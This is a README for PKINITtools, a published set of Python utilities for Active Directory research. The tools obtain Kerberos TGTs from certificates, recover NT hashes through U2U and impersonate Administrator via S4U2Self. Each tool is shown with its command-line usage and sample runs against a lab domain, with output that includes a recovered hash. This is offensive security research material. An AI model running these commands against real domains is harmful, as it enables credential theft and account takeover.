# PKINIT tools

This repository contains some utilities for playing with PKINIT and certificates.  
The tools are built on [minikerberos](https://github.com/skelsec/minikerberos/tree/master/minikerberos) and [impacket](https://github.com/SecureAuthCorp/impacket). Accompanying blogpost with more context: <https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/>

## Installation
These tools are only compatible with Python 3.5+. Clone the repository from GitHub, install the dependencies and you should be good to go:

```bash
git clone https://github.com/dirkjanm/PKINITtools
pip3 install impacket minikerberos
```

Using a virtualenv for this is recommended.

## Tools

### gettgtpkinit.py
Request a TGT using a PFX file, either as file or as base64 encoded blob, or PEM files for cert+key. This uses Kerberos PKINIT and will output a TGT into the specified ccache. It will also print the AS-REP encryption key which you may need for the getnthash.py tool. Usage example:

```
(PKINITtools) user@localhost:~/PKINITtools$ python gettgtpkinit.py -h
usage: gettgtpkinit.py [-h] [-cert-pfx file] [-pfx-pass password] [-pfx-base64 BASE64] [-cert-pem file] [-key-pem file] [-dc-ip DC_IP] [-v]
                       domain/username ccache

Requests a TGT using Kerberos PKINIT and either a PEM or PFX based certificate+key

positional arguments:
  domain/username     Domain and username in the cert
  ccache              ccache file to store the TGT in

optional arguments:
  -h, --help          show this help message and exit
  -cert-pfx file      PFX file
  -pfx-pass password  PFX file password
  -pfx-base64 BASE64  PFX file as base64 string
  -cert-pem file      Certificate in PEM format
  -key-pem file       Private key file in PEM format
  -dc-ip DC_IP        DC IP or hostname to use as KDC
  -v, --verbose

(PKINITtools) user@localhost:~/PKINITtools$ python gettgtpkinit.py testsegment.local/s2019dc\$ -cert-pfx ~/impacket-py3/cert.pfx -pfx-pass hoi s2019dc.ccache
2021-07-27 21:25:24,299 minikerberos INFO     Loading certificate and key from file
2021-07-27 21:25:24,316 minikerberos INFO     Requesting TGT
2021-07-27 21:25:24,333 minikerberos INFO     AS-REP encryption key (you might need this later):
2021-07-27 21:25:24,333 minikerberos INFO     5769dff44ebeaa5a37b4e9f7005f63063ffd7c198b747ae72021901e8063b0e3
2021-07-27 21:25:24,336 minikerberos INFO     Saved TGT to file
```

### getnthash.py
Use Kerberos U2U to submit a TGS request for yourself. This will include with the PAC which in turn contains the NT hash that you can decrypt with the AS-REP key that was used for your specific TGT. It's magic really. This tool requires a TGT resulting from PKINIT to be in your `KRB5CCNAME` env variable. Usage:

```
(PKINITtools) user@localhost:~/PKINITtools$ python getnthash.py -h
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

usage: getnthash.py [-h] -key KEY [-dc-ip ip address] [-debug] identity

positional arguments:
  identity           domain/username

optional arguments:
  -h, --help         show this help message and exit
  -key KEY           AS REP key from gettgtpkinit.py
  -dc-ip ip address  IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
  -debug             Turn DEBUG output ON

(PKINITtools) user@localhost:~/PKINITtools$ export KRB5CCNAME=s2019dc.ccache
(PKINITtools) user@localhost:~/PKINITtools$ python getnthash.py testsegment.local/s2019dc\$ -key 5769dff44ebeaa5a37b4e9f7005f63063ffd7c198b747ae72021901e8063b0e3
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
fa6b130d73311d1be5495f589f9f4571
```

### gets4uticket.py
Uses Kerberos S4U2Self to request a service ticket that is valid on the host for which you've obtained a certificate. This ticket can then be used to interact with the original host. This only requires a TGT for the machine account of this host. This TGT should be in a ccache file that you specify in the `kerberos_connection_url`. The only accepted `kerberos_connection_url` for this example is one containing a ccache file, so for example `kerberos+ccache://domain.local\\victimhostname\$:victimhostname.ccache@kdchostname.domain.local`. The SPN should be a service name on the host you are impersonating, you can't use this for delegation attacks (since it does not implement S4U2Proxy, there are plenty of tools already for that). Usage:

```
(PKINITtools) user@localhost:~/PKINITtools$ python gets4uticket.py -h
usage: gets4uticket.py [-h] [-v] kerberos_connection_url spn targetuser ccache

Gets an S4U2self ticket impersonating given user

positional arguments:
  kerberos_connection_url
                        the kerberos target string in the following format kerberos+ccache://domain\user:file.ccache@<domaincontroller-ip>
  spn                   the service principal in format <service>/<server-hostname>@<domain> Example: cifs/fileserver.test.corp@TEST.corp for a
                        TGS ticket to be used for file access on server "fileserver". IMPORTANT: SERVER'S HOSTNAME MUST BE USED, NOT IP!!!
  targetuser
  ccache                ccache file to store the TGT ticket in

optional arguments:
  -h, --help            show this help message and exit
  -v, --verbose

(PKINITtools) user@localhost:~/PKINITtools$ python gets4uticket.py kerberos+ccache://testsegment.local\\s2019dc\$:s2019dc.ccache@s2016dc.testsegment.local cifs/s2019dc.testsegment.local@testsegment.local Administrator@testsegment.local out.ccache -v
2021-07-28 10:09:13,687 minikerberos INFO     Trying to get SPN with Administrator@testsegment.local for cifs/s2019dc.testsegment.local@testsegment.local
2021-07-28 10:09:13,695 minikerberos INFO     Success!
2021-07-28 10:09:13,696 minikerberos INFO     Done!
```


## License
MIT

## Credits
* [SkelSec](https://twitter.com/skelsec) for [minikerberos](https://github.com/skelsec/minikerberos/tree/master/minikerberos)
* Alberto Solino and the team at SecureAuthCorp for [impacket](https://github.com/SecureAuthCorp/impacket)
* [Mor Rubin](https://twitter.com/rubin_mor) for their first PKINIT implementation in python as part of [AzureADJoinedMachinePTC](https://github.com/morRubin/AzureADJoinedMachinePTC)
* [Benjamin Delpy](https://twitter.com/gentilkiwi) for implementing these things in [kekeo](https://github.com/gentilkiwi/kekeo)
